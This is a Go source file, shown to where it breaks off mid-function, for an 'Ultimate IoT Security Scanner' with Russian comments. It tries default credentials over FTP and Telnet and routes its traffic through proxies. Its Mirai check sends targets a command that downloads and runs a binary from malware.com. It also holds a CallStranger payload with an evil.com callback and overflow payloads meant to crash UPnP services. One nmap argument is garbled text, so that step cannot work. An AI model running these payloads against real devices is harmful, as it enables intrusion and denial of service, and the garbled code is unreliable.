package main

import (
    "bufio"
    "bytes"
    "context"
    "crypto/tls"
    "encoding/json"
    "encoding/xml"
    "flag"
    "fmt"
    "io"
    "log"
    "net"
    "net/http"
    stdurl "net/url"
    "os"
    "os/exec"
    "strconv"
    "strings"
    "sync"
    "time"

    "golang.org/x/net/proxy"
)

// -----------------------------------------------------------------------------
// Структуры данных
// -----------------------------------------------------------------------------

// Device представляет IoT-устройство
type Device struct {
    IP         string
    MAC        string
    Vendor     string
    OpenPorts  []int
    Protocols  map[string]interface{}
    DeviceType string // Для классификации (ip_camera, router и т.д.)
}

// ScanResult содержит результаты сканирования
type ScanResult struct {
    Device              Device
    Vulnerabilities     []Vulnerability
    FoundCredentials    []Credential
    SecurityIssues      []SecurityIssue
    ConfigurationIssues []ConfigurationIssue
    ReportFile          string
}

// Vulnerability описывает уязвимость
type Vulnerability struct {
    Name        string
    Description string
    Severity    string
    CVE         string
    Port        int
    Protocol    string
}

// Credential содержит учетные данные
type Credential struct {
    Service  string
    Username string
    Password string
    Port     int
    Protocol string
}

// SecurityIssue описывает проблему безопасности
type SecurityIssue struct {
    Issue       string
    Description string
    Severity    string
    Port        int
    Protocol    string
}

// ConfigurationIssue описывает проблему конфигурации
type ConfigurationIssue struct {
    Issue       string
    Description string
    Severity    string
    Port        int
    Protocol    string
}

// NmapXML для парсинга результатов Nmap
type NmapXML struct {
    XMLName xml.Name `xml:"nmaprun"`
    Hosts   []struct {
        Address string `xml:"address>addr,attr"`
        Ports   struct {
            Port []struct {
                PortID  int    `xml:"portid,attr"`
                Service string `xml:"service>name,attr"`
                Script  []struct {
                    ID     string `xml:"id,attr"`
                    Output string `xml:"output,attr"`
                } `xml:"script"`
            } `xml:"port"`
        } `xml:"ports"`
    } `xml:"host"`
}

// -----------------------------------------------------------------------------
// Глобальные переменные
// -----------------------------------------------------------------------------

var (
    ipFile      string
    outputFile  string
    execCommand string
    proxyURL    string
    proxyFile   string
    proxyType   string
    vulnScan    bool // Флаг для включения Nmap
    proxyDialer proxy.Dialer

    scanTimeout = 5 * time.Second
    maxWorkers  = 10

    // Расширенные списки портов
    commonTCPPorts   = []int{21, 22, 23, 80, 443, 554, 1883, 5672, 8080, 8081, 8883, 9000, 7547, 49152, 8088, 8888}
    commonUDPPorts   = []int{53, 67, 68, 69, 123, 161, 162, 500, 514, 1900, 5353}
    iotSpecificPorts = []int{1883, 8883, 5683, 5684, 5900, 7575, 8000, 8080, 8081, 9000, 10000, 48101}

    allPorts []int
)

// Расширенный список учетных данных
var commonCredentials = []Credential{
    {"http", "admin", "admin", 80, "http"},
    {"http", "root", "root", 80, "http"},
    {"http", "admin", "password", 80, "http"},
    {"http", "admin", "12345", 80, "http"},      // IP-камеры
    {"http", "root", "admin", 80, "http"},       // Роутеры
    {"http", "user", "user", 80, "http"},
    {"telnet", "root", "root", 23, "telnet"},
    {"telnet", "admin", "admin", 23, "telnet"},
    {"telnet", "admin", "12345", 23, "telnet"},
    {"ftp", "admin", "admin", 21, "ftp"},
    {"ftp", "anonymous", "", 21, "ftp"},
}

// Карта для классификации устройств
var deviceSignatures = map[string][]struct {
    Port   int
    Banner string
}{
    "ip_camera": {
        {Port: 554, Banner: "RTSP"},
        {Port: 80, Banner: "camera"},
        {Port: 80, Banner: "Hikvision"},
    },
    "router": {
        {Port: 80, Banner: "router"},
        {Port: 80, Banner: "admin"},
        {Port: 443, Banner: "login"},
    },
    "printer": {
        {Port: 515, Banner: "printer"},
        {Port: 631, Banner: "HP"},
    },
    "voip": {
        {Port: 5060, Banner: "SIP"},
        {Port: 5060, Banner: "VoIP"},
    },
}

// -----------------------------------------------------------------------------
// Функция main
// -----------------------------------------------------------------------------

func main() {
    parseFlags()
    if ipFile == "" {
        showUsageAndExit()
    }

    if err := setupProxy(); err != nil {
        log.Fatalf("Ошибка настройки прокси: %v", err)
    }

    showBanner()

    devices := loadDevicesFromFile(ipFile)
    if len(devices) == 0 {
        fmt.Println("Устройства не найдены")
        return
    }

    fmt.Printf("Найдено %d устройств. Запуск сканирования с %d потоками\n", len(devices), maxWorkers)

    results := scanAllDevices(devices)

    problemsFound := false
    var allResults []ScanResult

    for res := range results {
        allResults = append(allResults, res)
        printReport(res)

        if len(res.Vulnerabilities) > 0 || len(res.FoundCredentials) > 0 {
            problemsFound = true
        }
    }

    if outputFile != "" {
        if err := saveResultsToFile(allResults, outputFile); err != nil {
            log.Printf("Ошибка сохранения результатов: %v", err)
        }
    }

    if problemsFound && execCommand != "" {
        fmt.Println("\nОбнаружены проблемы — выполняется команда:", execCommand)
        if err := executeCommand(execCommand); err != nil {
            log.Printf("Ошибка выполнения команды: %v", err)
        }
    }
}

// -----------------------------------------------------------------------------
// Инициализация и парсинг флагов
// -----------------------------------------------------------------------------

func parseFlags() {
    flag.StringVar(&ipFile, "ipfile", "", "Файл с IP-адресами устройств")
    flag.StringVar(&outputFile, "output", "", "Файл для сохранения результатов")
    flag.StringVar(&execCommand, "exec", "", "Команда для выполнения при проблемах")
    flag.StringVar(&proxyURL, "proxy", "", "Прокси (например, socks5://127.0.0.1:1080)")
    flag.StringVar(&proxyFile, "proxyfile", "", "Файл с прокси")
    flag.StringVar(&proxyType, "proxytype", "socks5", "Тип прокси (socks5 или http)")
    flag.BoolVar(&vulnScan, "vulnscan", false, "Включить сканирование уязвимостей Nmap")
    workers := flag.Int("workers", maxWorkers, "Количество потоков")
    flag.Parse()

    maxWorkers = *workers

    allPorts = append(allPorts, commonTCPPorts...)
    allPorts = append(allPorts, iotSpecificPorts...)
}

func showUsageAndExit() {
    fmt.Printf("Usage: %s -ipfile=<ip-file> [-output=<output-file>] [-exec=<command>] [-proxy=<proxy-url>] [-proxyfile=<proxy-file>] [-proxytype=<type>] [-workers=<threads>] [-vulnscan]\n",
        os.Args[0])
    os.Exit(1)
}

func showBanner() {
    fmt.Println(`
    Ultimate IoT Security Scanner v2.0
    -----------------------------
    Расширенное сканирование IoT-устройств:
    - Сетевые протоколы (TCP/UDP)
    - Веб-интерфейсы и API
    - Промышленные протоколы
    - Беспроводные протоколы
    - Уязвимости прошивки
    - Облачные соединения
    - Nmap для эксплоитов
    - Проверки Mirai, Ripple20, UPnP
    `)
}

// -----------------------------------------------------------------------------
// Загрузка устройств и прокси
// -----------------------------------------------------------------------------

func loadDevicesFromFile(filename string) []Device {
    file, err := os.Open(filename)
    if err != nil {
        log.Fatal("Не удалось открыть файл с IP:", err)
    }
    defer file.Close()

    var devices []Device
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        ip := strings.TrimSpace(scanner.Text())
        if ip != "" {
            devices = append(devices, Device{IP: ip})
        }
    }

    if err := scanner.Err(); err != nil {
        log.Fatalf("Ошибка чтения файла %s: %v", filename, err)
    }
    return devices
}

func setupProxy() error {
    if proxyFile != "" {
        proxies, err := loadProxiesFromFile(proxyFile)
        if err != nil {
            return fmt.Errorf("ошибка чтения файла прокси: %w", err)
        }
        if len(proxies) > 0 {
            url := fmt.Sprintf("%s://%s", proxyType, proxies[0])
            dialer, err := proxy.FromURL(parseURL(url), proxy.Direct)
            if err != nil {
                return fmt.Errorf("ошибка настройки прокси (%s): %w", url, err)
            }
            proxyDialer = dialer
            fmt.Println("Используется прокси из файла:", url)
        }
    } else if proxyURL != "" {
        dialer, err := proxy.FromURL(parseURL(proxyURL), proxy.Direct)
        if err != nil {
            return fmt.Errorf("ошибка настройки прокси: %w", err)
        }
        proxyDialer = dialer
        fmt.Println("Используется прокси:", proxyURL)
    }
    return nil
}

func loadProxiesFromFile(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var proxies []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            proxies = append(proxies, line)
        }
    }
    return proxies, scanner.Err()
}

func parseURL(raw string) *stdurl.URL {
    u, err := stdurl.Parse(raw)
    if err != nil {
        log.Fatalf("Некорректный URL прокси: %v", err)
    }
    return u
}

// -----------------------------------------------------------------------------
// Сканирование устройств
// -----------------------------------------------------------------------------

func scanAllDevices(devices []Device) <-chan ScanResult {
    results := make(chan ScanResult, len(devices))
    var wg sync.WaitGroup
    sem := make(chan struct{}, maxWorkers)

    for _, dev := range devices {
        wg.Add(1)
        sem <- struct{}{}
        go func(d Device) {
            defer wg.Done()
            defer func() { <-sem }()
            res := fullDeviceScan(d)
            results <- res
        }(dev)
    }

    go func() {
        wg.Wait()
        close(results)
    }()

    return results
}

func fullDeviceScan(device Device) ScanResult {
    result := ScanResult{Device: device}
    scanDevicePorts(&result)
    classifyDevice(&result) // Классификация устройства
    scanProtocols(&result)
    performDeepInspection(&result)
    if vulnScan {
        runNmapVulnScan(&result) // Сканирование Nmap
    }
    result.ReportFile = fmt.Sprintf("scan_report_%s_%d.json", device.IP, time.Now().Unix())
    return result
}

// -----------------------------------------------------------------------------
// Классификация устройств
// -----------------------------------------------------------------------------

func classifyDevice(result *ScanResult) {
    for devType, signatures := range deviceSignatures {
        for _, sig := range signatures {
            if portIsInList(result.Device.OpenPorts, sig.Port) {
                banner := getServiceBanner(result.Device.IP, sig.Port)
                if strings.Contains(strings.ToLower(banner), strings.ToLower(sig.Banner)) {
                    result.Device.DeviceType = devType
                    fmt.Printf("Устройство %s классифицировано как %s\n", result.Device.IP, devType)
                    return
                }
            }
        }
    }
    result.Device.DeviceType = "unknown"
}

func getServiceBanner(ip string, port int) string {
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), scanTimeout)
    if err != nil {
        return ""
    }
    defer conn.Close()

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    n, err := conn.Read(buf)
    if err != nil {
        return ""
    }
    return string(buf[:n])
}

// -----------------------------------------------------------------------------
// Сканирование портов
// -----------------------------------------------------------------------------

func scanDevicePorts(result *ScanResult) {
    var openPorts []int
    var wg sync.WaitGroup
    var mutex sync.Mutex
    portSem := make(chan struct{}, maxWorkers)

    for _, port := range allPorts {
        wg.Add(1)
        portSem <- struct{}{}
        go func(p int) {
            defer wg.Done()
            defer func() { <-portSem }()
            if isPortOpen(result.Device.IP, p, "tcp", scanTimeout) {
                mutex.Lock()
                openPorts = append(openPorts, p)
                mutex.Unlock()
            }
        }(port)
    }

    for _, port := range commonUDPPorts {
        wg.Add(1)
        portSem <- struct{}{}
        go func(p int) {
            defer wg.Done()
            defer func() { <-portSem }()
            if isPortOpen(result.Device.IP, p, "udp", scanTimeout) {
                mutex.Lock()
                openPorts = append(openPorts, p)
                mutex.Unlock()
            }
        }(port)
    }

    wg.Wait()
    result.Device.OpenPorts = openPorts
}

// -----------------------------------------------------------------------------
// Nmap сканирование уязвимостей
// -----------------------------------------------------------------------------

func runNmapVulnScan(result *ScanResult) {
    if !isNmapInstalled() {
        log.Println("Nmap не установлен. Пропускается сканирование уязвимостей.")
        return
    }

    ports := strings.Join(intSliceToStringSlice(result.Device.OpenPorts), ",")
    if ports == "" {
        return
    }

    outputFile := fmt.Sprintf("nmap_%s.xml", result.Device.IP)
    cmd := exec.Command("nmap", "-p", ports, "-sV", "--script", "vuln", result.Device.IP, "-oinburgh, Scotland, UK")
    if err := cmd.Run(); err != nil {
        log.Printf("Ошибка выполнения Nmap для %s: %v", result.Device.IP, err)
        return
    }

    nmapResults, err := parseNmapOutput(outputFile)
    if err != nil {
        log.Printf("Ошибка парсинга результатов Nmap: %v", err)
        return
    }

    for _, host := range nmapResults.Hosts {
        if host.Address == result.Device.IP {
            for _, port := range host.Ports.Port {
                for _, script := range port.Script {
                    if strings.Contains(script.Output, "VULNERABLE") {
                        vuln := Vulnerability{
                            Name:        script.ID,
                            Description: script.Output,
                            Severity:    "High",
                            CVE:         extractCVE(script.Output),
                            Port:        port.PortID,
                            Protocol:    port.Service,
                        }
                        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
                    }
                }
            }
        }
    }

    os.Remove(outputFile) // Очистка
}

func isNmapInstalled() bool {
    cmd := exec.Command("nmap", "--version")
    return cmd.Run() == nil
}

func parseNmapOutput(filename string) (NmapXML, error) {
    var nmapResults NmapXML
    data, err := os.ReadFile(filename)
    if err != nil {
        return nmapResults, err
    }
    err = xml.Unmarshal(data, &nmapResults)
    return nmapResults, err
}

func extractCVE(output string) string {
    if strings.Contains(output, "CVE-") {
        parts := strings.Split(output, " ")
        for _, part := range parts {
            if strings.HasPrefix(part, "CVE-") {
                return part
            }
        }
    }
    return "N/A"
}

func intSliceToStringSlice(ints []int) []string {
    var strs []string
    for _, i := range ints {
        strs = append(strs, strconv.Itoa(i))
    }
    return strs
}

// -----------------------------------------------------------------------------
// Проверка протоколов
// -----------------------------------------------------------------------------

func scanProtocols(result *ScanResult) {
    result.Device.Protocols = make(map[string]interface{})

    for _, port := range result.Device.OpenPorts {
        switch port {
        case 80, 443, 8080, 8081, 8443, 8888:
            checkWebServices(result, port)
        case 21:
            checkFTP(result, port)
        case 22:
            checkSSH(result)
        case 23:
            checkTelnet(result)
        case 1883, 8883:
            checkMQTT(result, port)
        case 5683, 5684:
            checkCoAP(result, port)
        case 5672:
            checkAMQP(result)
        case 1900:
            checkUPnP(result)
        case 502:
            checkModbus(result)
        case 47808:
            checkBACnet(result)
        case 7547:
            checkTR069(result)
        case 10000:
            checkNDMP(result)
        case 554:
            checkRTSP(result, port)
        case 48101:
            checkMirai(result)
        }
    }
}

// -----------------------------------------------------------------------------
// Проверки протоколов и эксплоитов
// -----------------------------------------------------------------------------

func checkFTP(result *ScanResult, port int) {
    for _, cred := range commonCredentials {
        if cred.Service != "ftp" || cred.Port != port {
            continue
        }
        if testFTPCredentials(result.Device.IP, cred.Username, cred.Password) {
            result.FoundCredentials = append(result.FoundCredentials, cred)
            vuln := Vulnerability{
                Name:        "FTP Default Credentials",
                Description: fmt.Sprintf("Найдены учетные данные %s:%s для FTP", cred.Username, cred.Password),
                Severity:    "Critical",
                CVE:         "N/A",
                Port:        port,
                Protocol:    "ftp",
            }
            result.Vulnerabilities = append(result.Vulnerabilities, vuln)
        }
    }
}

func testFTPCredentials(ip, user, pass string) bool {
    conn, err := net.DialTimeout("tcp", ip+":21", scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(scanTimeout))
    buf := make([]byte, 256)
    _, err = conn.Read(buf)
    if err != nil {
        return false
    }

    if _, err := conn.Write([]byte(fmt.Sprintf("USER %s\r\n", user))); err != nil {
        return false
    }
    _, err = conn.Read(buf)
    if err != nil {
        return false
    }

    if _, err := conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", pass))); err != nil {
        return false
    }
    _, err = conn.Read(buf)
    if err != nil {
        return false
    }

    return strings.Contains(string(buf), "230")
}

func checkMQTT(result *ScanResult, port int) {
    if testMQTTAnoymousAccess(result.Device.IP, port) {
        vuln := Vulnerability{
            Name:        "MQTT Anonymous Access",
            Description: "Обнаружен анонимный доступ к MQTT-брокеру",
            Severity:    "High",
            CVE:         "N/A",
            Port:        port,
            Protocol:    "mqtt",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    } else {
        issue := SecurityIssue{
            Issue:       "MQTT Enabled",
            Description: "Сервис MQTT активен, рекомендуется проверить аутентификацию",
            Severity:    "Medium",
            Port:        port,
            Protocol:    "mqtt",
        }
        result.SecurityIssues = append(result.SecurityIssues, issue)
    }
}

func testMQTTAnoymousAccess(ip string, port int) bool {
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    connectPacket := []byte{
        0x10, 0x0C, 0x00, 0x04, 'M', 'Q', 'T', 'T', 0x04, 0x02, 0x00, 0x3C, 0x00, 0x00,
    }
    if _, err := conn.Write(connectPacket); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 4)
    n, err := conn.Read(buf)
    if err != nil || n < 4 {
        return false
    }
    return buf[0] == 0x20 && buf[2] == 0x00
}

func checkCoAP(result *ScanResult, port int) {
    if testCoAPAnonymousAccess(result.Device.IP, port) {
        vuln := Vulnerability{
            Name:        "CoAP Anonymous Access",
            Description: "Обнаружен открытый доступ к ресурсам CoAP",
            Severity:    "High",
            CVE:         "N/A",
            Port:        port,
            Protocol:    "coap",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    } else {
        issue := SecurityIssue{
            Issue:       "CoAP Enabled",
            Description: "Сервис CoAP активен, рекомендуется проверить безопасность",
            Severity:    "Medium",
            Port:        port,
            Protocol:    "coap",
        }
        result.SecurityIssues = append(result.SecurityIssues, issue)
    }
}

func testCoAPAnonymousAccess(ip string, port int) bool {
    conn, err := net.DialTimeout("udp", net.JoinHostPort(ip, strconv.Itoa(port)), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    getPacket := []byte{
        0x40, 0x01, 0x00, 0x01, 0xB1, 0x0E, '.', 'w', 'e', 'l', 'l', '-', 'k', 'n', 'o', 'w', 'n', '/', 'c', 'o', 'r', 'e',
    }
    if _, err := conn.Write(getPacket); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    n, err := conn.Read(buf)
    if err != nil {
        return false
    }
    return n > 0 && buf[1] == 0x45
}

func checkRTSP(result *ScanResult, port int) {
    if testRTSPAnonymousAccess(result.Device.IP, port) {
        vuln := Vulnerability{
            Name:        "RTSP Anonymous Access",
            Description: "Доступ к видеопотоку RTSP без аутентификации",
            Severity:    "Critical",
            CVE:         "N/A",
            Port:        port,
            Protocol:    "rtsp",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }
}

func testRTSPAnonymousAccess(ip string, port int) bool {
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    request := "DESCRIBE rtsp://%s/stream RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    if _, err := fmt.Fprintf(conn, request, ip); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    n, err := conn.Read(buf)
    if err != nil {
        return false
    }
    return strings.Contains(string(buf[:n]), "RTSP/1.0 200 OK")
}

func checkMirai(result *ScanResult) {
    // Проверка портов, связанных с Mirai
    miraiPorts := []int{48101, 23, 2323, 5555}
    for _, port := range miraiPorts {
        if portIsInList(result.Device.OpenPorts, port) {
            if testMiraiInfection(result.Device.IP, port) {
                vuln := Vulnerability{
                    Name:        "Potential Mirai Infection",
                    Description: "Обнаружены признаки заражения ботнетом Mirai",
                    Severity:    "Critical",
                    CVE:         "N/A",
                    Port:        port,
                    Protocol:    "tcp",
                }
                result.Vulnerabilities = append(result.Vulnerabilities, vuln)
            }
        }
    }
}

func testMiraiInfection(ip string, port int) bool {
    // 1. Проверка характерного баннера Mirai
    banner := getServiceBanner(ip, port)
    if strings.Contains(banner, "Mirai") || 
       strings.Contains(banner, "BusyBox") || 
       strings.Contains(banner, "Telnet") {
        return true
    }

    // 2. Проверка реакции на команды Mirai
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Команда, на которую реагирует бот
    if _, err := conn.Write([]byte("GET /shell?cd /tmp; wget http://malware.com/mirai.arm; chmod 777 mirai.arm; ./mirai.arm\n")); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    n, err := conn.Read(buf)
    if err != nil {
        return false
    }

    response := string(buf[:n])
    return strings.Contains(response, "wget") || 
           strings.Contains(response, "chmod") ||
           strings.Contains(response, "exec")
}

func checkUPnP(result *ScanResult) {
    if portIsInList(result.Device.OpenPorts, 1900) {
        if testUPnPCallStranger(result.Device.IP) {
            vuln := Vulnerability{
                Name:        "UPnP CallStranger (CVE-2020-12695)",
                Description: "Уязвимость позволяет использовать устройство для атак SSRF и обхода брандмауэров",
                Severity:    "High",
                CVE:         "CVE-2020-12695",
                Port:        1900,
                Protocol:    "udp",
            }
            result.Vulnerabilities = append(result.Vulnerabilities, vuln)
        }

        if testUPnPBufferOverflow(result.Device.IP) {
            vuln := Vulnerability{
                Name:        "UPnP Buffer Overflow",
                Description: "Переполнение буфера в реализации UPnP",
                Severity:    "Critical",
                CVE:         "CVE-2013-0229",
                Port:        1900,
                Protocol:    "udp",
            }
            result.Vulnerabilities = append(result.Vulnerabilities, vuln)
        }
    }
}

func testUPnPCallStranger(ip string) bool {
    conn, err := net.DialTimeout("udp", net.JoinHostPort(ip, "1900"), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Злонамеренный SUBSCRIBE с Callback на внешний URL
    payload := `M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
Man: "ssdp:discover"
MX: 1
ST: upnp:rootdevice
CALLBACK: <http://evil.com/notify>
NT: upnp:event
TIMEOUT: Second-1800

`

    if _, err := conn.Write([]byte(payload)); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    buf := make([]byte, 1024)
    _, err = conn.Read(buf)
    return err == nil // Уязвимые устройства ответят на такой запрос
}

func testUPnPBufferOverflow(ip string) bool {
    conn, err := net.DialTimeout("udp", net.JoinHostPort(ip, "1900"), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Создаем переполнение буфера в поле Location
    overflow := strings.Repeat("A", 2000)
    payload := fmt.Sprintf(`M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
Man: "ssdp:discover"
MX: 1
ST: upnp:rootdevice
Location: %s

`, overflow)

    if _, err := conn.Write([]byte(payload)); err != nil {
        return false
    }

    // Проверяем, упало ли устройство (повторный ping)
    if !isPortOpen(ip, 1900, "udp", scanTimeout) {
        return true
    }

    return false
}

func testUPnPVulnerability(ip string) bool {
    conn, err := net.DialTimeout("udp", ip+":1900", scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    maliciousPayload := strings.Repeat("A", 2000)
    msg := fmt.Sprintf("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nX-Payload: %s\r\n\r\n", maliciousPayload)
    if _, err := conn.Write([]byte(msg)); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    _, err = conn.Read(buf)
    return err != nil
}

func checkSSH(result *ScanResult) {
    issue := SecurityIssue{
        Issue:       "SSH Enabled",
        Description: "Сервис SSH активен, рекомендуется проверить конфигурацию",
        Severity:    "Low",
        Port:        22,
        Protocol:    "ssh",
    }
    result.SecurityIssues = append(result.SecurityIssues, issue)
}

func checkTelnet(result *ScanResult) {
    for _, cred := range commonCredentials {
        if cred.Service != "telnet" {
            continue
        }
        if testTelnetCredentials(result.Device.IP, cred.Username, cred.Password) {
            result.FoundCredentials = append(result.FoundCredentials, cred)
            vuln := Vulnerability{
                Name:        "Default Telnet Credentials",
                Description: fmt.Sprintf("Найдены учетные данные %s:%s для Telnet", cred.Username, cred.Password),
                Severity:    "Critical",
                CVE:         "N/A",
                Port:        23,
                Protocol:    "telnet",
            }
            result.Vulnerabilities = append(result.Vulnerabilities, vuln)
        }
    }
}

func checkAMQP(result *ScanResult) {
    issue := SecurityIssue{
        Issue:       "AMQP Enabled",
        Description: "Сервис AMQP активен, рекомендуется проверить аутентификацию",
        Severity:    "Medium",
        Port:        5672,
        Protocol:    "amqp",
    }
    result.SecurityIssues = append(result.SecurityIssues, issue)
}

func checkModbus(result *ScanResult) {
    issue := SecurityIssue{
        Issue:       "Modbus Enabled",
        Description: "Сервис Modbus активен, рекомендуется проверить доступ",
        Severity:    "Medium",
        Port:        502,
        Protocol:    "modbus",
    }
    result.SecurityIssues = append(result.SecurityIssues, issue)
}

func checkBACnet(result *ScanResult) {
    issue := SecurityIssue{
        Issue:       "BACnet Enabled",
        Description: "Сервис BACnet активен, рекомендуется проверить доступ",
        Severity:    "Medium",
        Port:        47808,
        Protocol:    "bacnet",
    }
    result.SecurityIssues = append(result.SecurityIssues, issue)
}

func checkTR069(result *ScanResult) {
    issue := SecurityIssue{
        Issue:       "TR-069 Enabled",
        Description: "Сервис TR-069 активен, рекомендуется проверить конфигурацию",
        Severity:    "Medium",
        Port:        7547,
        Protocol:    "tr069",
    }
    result.SecurityIssues = append(result.SecurityIssues, issue)
}

func checkNDMP(result *ScanResult) {
    issue := SecurityIssue{
        Issue:       "NDMP Enabled",
        Description: "Сервис NDMP активен, рекомендуется проверить доступ",
        Severity:    "Medium",
        Port:        10000,
        Protocol:    "ndmp",
    }
    result.SecurityIssues = append(result.SecurityIssues, issue)
}

// -----------------------------------------------------------------------------
// Глубокая инспекция
// -----------------------------------------------------------------------------

func performDeepInspection(result *ScanResult) {
    checkFirmwareVersion(result)
    if testInsecureCloudConnection(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "Insecure Cloud Connection",
            Description: "Обнаружены незащищённые подключения к облачным сервисам",
            Severity:    "High",
            CVE:         "N/A",
            Port:        0,
            Protocol:    "cloud",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }
    checkCloudConnections(result)
    checkWirelessConfigs(result)
    checkIndustrialProtocols(result)
    checkCommonBackdoors(result)
    checkRipple20(result)
}

func checkFirmwareVersion(result *ScanResult) {
    for _, port := range result.Device.OpenPorts {
        if port == 80 || port == 443 || port == 8080 || port == 8443 {
            scheme := "http"
            if port == 443 || port == 8443 {
                scheme = "https"
            }
            url := fmt.Sprintf("%s://%s:%d/version", scheme, result.Device.IP, port)
            client := newHTTPClient()
            resp, err := client.Get(url)
            if err != nil {
                continue
            }
            resp.Body.Close()
            if resp.StatusCode == 200 {
                issue := SecurityIssue{
                    Issue:       "Exposed Firmware Version",
                    Description: "Версия прошивки доступна через /version",
                    Severity:    "Low",
                    Port:        port,
                    Protocol:    "http",
                }
                result.SecurityIssues = append(result.SecurityIssues, issue)
            }
        }
    }
}

func checkCloudConnections(result *ScanResult) {
    cloudDomains := []string{
        "aws.amazon.com", "azure.com", "googleapis.com", "myq-cloud.com", "smartthings.com",
    }
    for _, port := range result.Device.OpenPorts {
        if port == 443 || port == 8883 {
            address := net.JoinHostPort(result.Device.IP, strconv.Itoa(port))
            conn, err := net.DialTimeout("tcp", address, scanTimeout)
            if err != nil {
                continue
            }
            defer conn.Close()

            tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
            if err := tlsConn.Handshake(); err != nil {
                continue
            }
            state := tlsConn.ConnectionState()
            if len(state.PeerCertificates) == 0 {
                continue
            }
            cert := state.PeerCertificates[0]
            for _, domain := range cert.DNSNames {
                for _, cloud := range cloudDomains {
                    if strings.Contains(domain, cloud) {
                        issue := SecurityIssue{
                            Issue:       "Cloud Connection Detected",
                            Description: fmt.Sprintf("Обнаружено соединение с облаком: %s", domain),
                            Severity:    "Medium",
                            Port:        port,
                            Protocol:    "tls",
                        }
                        result.SecurityIssues = append(result.SecurityIssues, issue)
                    }
                }
            }
        }
    }
}

func testInsecureCloudConnection(ip string) bool {
    insecurePorts := []int{1883, 8883, 5683, 8080, 8081}
    for _, port := range insecurePorts {
        if isPortOpen(ip, port, "tcp", scanTimeout) {
            return true
        }
    }
    return false
}

func checkWirelessConfigs(result *ScanResult) {
    for _, port := range result.Device.OpenPorts {
        if port == 80 || port == 443 || port == 8080 {
            scheme := "http"
            if port == 443 {
                scheme = "https"
            }
            url := fmt.Sprintf("%s://%s:%d/wireless", scheme, result.Device.IP, port)
            client := newHTTPClient()
            resp, err := client.Get(url)
            if err != nil {
                continue
            }
            resp.Body.Close()
            if resp.StatusCode == 200 {
                issue := SecurityIssue{
                    Issue:       "Exposed Wireless Config",
                    Description: "Конфигурация Wi-Fi доступна через /wireless",
                    Severity:    "High",
                    Port:        port,
                    Protocol:    scheme,
                }
                result.SecurityIssues = append(result.SecurityIssues, issue)
            }
        }
    }
}

func checkIndustrialProtocols(result *ScanResult) {
    // Проверка Modbus (CVE-2015-7938)
    if portIsInList(result.Device.OpenPorts, 502) && testModbusVulnerability(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "Modbus Authentication Bypass (CVE-2015-7938)",
            Description: "Отсутствие аутентификации в протоколе Modbus",
            Severity:    "High",
            CVE:         "CVE-2015-7938",
            Port:        502,
            Protocol:    "modbus",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }

    // Проверка BACnet (CVE-2016-9363)
    if portIsInList(result.Device.OpenPorts, 47808) && testBACnetVulnerability(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "BACnet Stack Overflow (CVE-2016-9363)",
            Description: "Переполнение стека в реализации BACnet",
            Severity:    "Critical",
            CVE:         "CVE-2016-9363",
            Port:        47808,
            Protocol:    "bacnet",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }
}

func testModbusVulnerability(ip string) bool {
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, "502"), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Читаем баннер Modbus
    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    n, err := conn.Read(buf)
    if err != nil {
        return false
    }

    // Проверяем, отвечает ли устройство на Modbus-запрос без аутентификации
    modbusRequest := []byte{
        0x00, 0x01, // Transaction ID
        0x00, 0x00, // Protocol ID
        0x00, 0x06, // Length
        0x01,       // Unit ID
        0x03,       // Function Code (Read Holding Registers)
        0x00, 0x00, // Starting Address
        0x00, 0x01, // Quantity
    }

